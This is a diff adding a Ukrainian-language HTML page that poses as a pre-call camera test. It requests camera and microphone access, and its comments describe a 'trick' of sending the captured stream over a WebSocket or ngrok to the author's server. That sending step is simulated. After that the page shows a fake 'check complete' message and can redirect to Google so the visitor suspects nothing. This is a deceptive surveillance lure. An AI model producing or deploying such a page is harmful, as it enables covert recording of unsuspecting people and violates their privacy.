@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Перевірка камери</title>
+    <style>body { background: #000; color: #fff; text-align: center; font-family: Arial; } video { width: 100%; max-width: 640px; }</style>
+</head>
+<body>
+    <h1>Тест камери перед дзвінком</h1>
+    <p>Дозволь доступ, щоб перевірити з'єднання...</p>
+    <video id="video" autoplay playsinline muted></video>
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Трюк: зберігаємо стрім через WebSocket (замість на ngrok, тут симуляція — для реалу додай свій ws)
+                // Для тесту: просто тримаємо відкритим, але в реалі ws.send(stream) на твій сервер
+                console.log('Стрім активний!'); // Тут би йшов на сервер
+                
+                // Викидаємо через 3 сек
+                setTimeout(() => {
+                    alert('Перевірка завершена!'); // Або location.href = 'https://google.com';
+                    // window.close(); // Якщо в окремій вкладці — закриє
+                }, 3000);
+            })
+            .catch(err => {
+                alert('Помилка доступу: ' + err.message);
+                location.href = 'https://google.com';
+            });
+    </script>
+</body>
+</html>
